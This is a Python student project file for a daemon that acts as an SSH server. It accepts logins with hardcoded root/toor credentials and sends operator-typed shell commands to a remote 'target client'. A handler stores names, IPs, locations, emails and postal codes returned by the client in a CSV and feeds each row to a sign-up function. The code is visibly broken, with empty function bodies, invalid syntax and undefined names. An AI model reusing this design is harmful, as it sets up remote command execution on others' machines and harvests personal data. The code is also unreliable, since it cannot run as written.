# test_daemon.py

#==============================================================================
 #   Assignment:  Major Project - Tunelling Milestone 1
 #
 #       Author:  Alistair Godwin, Micheal Sciortino, Francesso Losi
 #     Language:  Python 3
 #                      
 #   To Compile: Paramiko must be available 
 #
 #    Class:  DPI912 
 #    Professor:  Harvey Kaduri
 #    Due Date:  Mar 24th 2020 
 #    Submitted: Mar 22nd 2020
 #
 #-----------------------------------------------------------------------------
 #
 #  Description: This program is a skeleton daemon that acts as an ssh server using paramiko. It awaits connections and prompts on a connection to execute shell commands onto the target client.
 #      
 #        Input:  N/A
 #
 #       Output:  Outputs to console results of command executed
 #
 #    Algorithm:  Invokes the Paramiko supplied functions to create and manage an SSH server. Continously request new commands and then send them to the target client. Await for 
 #               
 #             
 #   Required Features Not Included: N/A
 #
 #   Known Bugs:  N/A 
 #      
 #
 #   Classification: N/A
 #
#==============================================================================

import csv
import os
import socket
import paramiko
import threading
import sys
import signal
from signal import SIGTERM

host_key = paramiko.RSAKey(filename='test_rsa.key')
def child():
   #childWrites="in child"
   #logger.info(f"Child: {os.getpid()} {childWrites} ")

def parent():
   #logger.info(f"Parent: {os.getpid()} is logging)
   
def grimResper(signalNumber,frame):
   while True:
        try:
            pid,status=os.waitpid(-1,os.WNOHANG)
        except OSError:
            return
        
        if pid==0:
            return
def exitErr(msg,status=1):
   print(msg)
   sys.exit(status)
def getpid(pidfile,default=None):
   try:
      with open(pidfile) as f:
         return int(pf.read().strip())
      except IOError:
         return default
def initDaemon():
	os.chdir('/')
	try:
		os.setsid()
	except:
		pass
	os.umask(0)
class Daemon(object):
   def __init__(self, pidfile,stdin='/dev/null',stdout='/dev/null',stderr='/dev/null'):
      self.stdin=stdin
      self.stdout=stdout
      self.stderr=stderr
      self.pidfile=pidfile
   
   def startService():
      try:
         sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.bind(getBinds())
         sock.listen(100)
         signal.signal(signal.SIGCHLD,grimReaper)
         print('[+] Listening for connection ...')
         while True:
            try:
               connection, clientAddr=sock.accept()
            except IOError as e:
               errorCode,message=e.args
               if errorCode==errno.EINTR
                  continue
               else:
                  raise
            try:           #first fork
               pid=os.fork()
               if pid==0:
                  sock.close()
                  startParamiko()
                  connection.close()
                  os._exit(0)
               else:
                  parent()
                  connection.close()
            except OSError as e:
               logger.info("First fork failed: %d (%s)"%(e.errno,e.strerror))
            
            initDaemon()
            
            try:        #2nd fork
               pid=os.fork()
               if pid==0:
                  child()
                  sock.close()
                  startParamiko()
                  connection.close()
                  os.exit(0)
               else:
                  parent()
                  connection.close()
            except OSError as e:
               logger.info("2nd fork failed: %d (%s)"%(e.errno,e.strerror))
            
            sys.stdout.flush()
            sys.stderr.flush()
            si=open(self,stdin,'r')
            so=open(self.stdout,'a+')
            se=open(self.stderr,'a+')
            os.dup2(si.fileno(),sys.stdin.fileno())
            os.dup2(so.fileno(),sys.stdout.fileno())
            os.dup2(se.fileno(),sys.stderr.fileno())
            
            atexitt.register(self.delpid)
            pid=str(os.getpid())
            with open(self.pidfile, 'w+') as f:
               f.write(pid)
   def delpid(self):
      os.remove(self.pidfile)
   
   def start(self):
      if getpid(self.pidfile):
         msg="Pidfile %s already exists. daemon already running"
         exitErr(msg%self.pidfile)
         self.server()
         self.run()
   
   def stop(self):
      pid=get_pid(self.pidfile)
      if not pid:
         msg="pidfile dont exist. deamon not running"
         print(msg%self.pidfile)
         return
      try:
         while true:
            os.kill(pid.SIGTERM)
            time.sleep(0.1)
      except OSError as e:
         error=e.strerrir
         if 'No such process' in error:
            if os.path.exists(self.pidfile):
               os.remove(self.pidfile)
         else:
            exitErr(error)
   def restart(self):
      self.stop()
      self.start()
   
   def run(self):
      raise NotImplementedError
   
   def startParamiko():
      try:
         t = paramiko.Transport(client)
         try:
             t.load_server_moduli()
         except:
             print('[-] (Failed to load moduli -- gex will be unsupported.)')
             raise
         t.add_server_key(host_key)
         server = Server()
         try:
             t.start_server(server=server)
         except paramiko.SSHException as x:
             print('[-] SSH negotiation failed.')
     
         chan = t.accept(20)
         print('[+] Authenticated!')
         print(chan.recv(1024))
         chan.send('Greetings from the server!')
         while True:
            command= input("Enter command: ").strip('\n')
            if (command == 'stop'):
               chan.send('stop')
               t.close()
               sys.exit(0)
            chan.send(command)
            results = chan.recv(1024)
            results.decode()
            handleData(results)
            print(results)
           
        except Exception as e:
           print('[-] Caught exception: '  + str(e))
           try:
              t.close()
           except:
              pass
           sys.exit(1)

class MyDaemon(Daemon):
   def run(self):
      while True:
         time.sleep(1)
      
def handleRequest(data):
   if !os.path.exists("peopleInfo.csv"):
      with open('peopleInfo.csv','w',newLine='') as f:#first arg may change, its the csv file name
         writer=csv.writer(f)
         thewriter.writerow(['First Name','Last Name','IP','Location','Email','Domain','Postal Code')
   else:
      data1=connection.recv()#here we'll recv the info being sent back by the client assuming its an array as of now
      with open('peopleInfo.csv','w',newLine='') as f:#first arg may change, its the csv file name
         writer=csv.writer(f)
         for i in range():
            for j in range(7):#any blank inputs are chaged to null
               if (len(data[i][j])<1):
                  data[i][j]="null"
            thewriter.writerow([data1[i][0],data1[i][1],data1[i][2],data1[i][3],data1[i][4],data1[i][5],data1[i][6]])
            #Alistairs signUp function called here with each row of data
            signUp(data1[i])
         
def getBinds():
    '''
    This function grabs the binding arguements for the connection
    In the clients case, this is the IPv6 address and the socket #
    return tuple - The connection properties 
    '''
    sockNum = -1
    sockIp = ""
    while sockNum < 0 and not sockIp:
        try: 
            sockNumTest = int(input("Provide a socket # for the daemon to host:"))
            sockIpTest = str(input("Provide an IPv6 addresss to host on:"))
        except Exception:
            print("Please Try Again...\n")
        else:
            sockNum = sockNumTest   
            sockIp = sockIpTest     

    return (sockIpTest, sockNumTest)

class Server (paramiko.ServerInterface):
   def _init_(self):
       self.event = threading.Event()
   def check_channel_request(self, kind, chanid):
       if kind == 'session':
           return paramiko.OPEN_SUCCEEDED
       return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
   def check_auth_password(self, username, password):
       if (username == 'root') and (password == 'toor'):
           return paramiko.AUTH_SUCCESSFUL
       return paramiko.AUTH_FAILED



if __name__="main":
   startService()
